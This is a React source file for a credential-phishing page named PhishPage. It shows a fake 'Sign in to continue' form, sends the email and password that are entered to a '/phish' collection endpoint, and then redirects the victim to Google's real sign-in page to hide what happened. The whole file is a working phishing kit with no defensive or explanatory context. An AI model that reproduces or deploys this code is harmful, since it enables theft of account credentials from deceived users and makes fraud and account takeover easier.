import React, { useState } from "react";

export default function PhishPage() {
  const [email, setEmail] = useState("");
  const [passcode, setPasscode] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch("http://localhost:8080/phish", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ email, passcode }),
    });
    window.location.href = "https://accounts.google.com";
  };

  return (
    <div className="d-flex justify-content-center align-items-center vh-100 bg-light">
      <form onSubmit={handleSubmit} className="bg-white p-4 rounded shadow" style={{ width: "320px" }}>
        <h4 className="text-center mb-3">Sign in to continue</h4>
        <input className="form-control mb-2" type="email" placeholder="Email" required value={email} onChange={e => setEmail(e.target.value)} />
        <input className="form-control mb-3" type="password" placeholder="Password" required value={passcode} onChange={e => setPasscode(e.target.value)} />
        <button className="btn btn-primary w-100" type="submit">Next</button>
      </form>
    </div>
  );
}
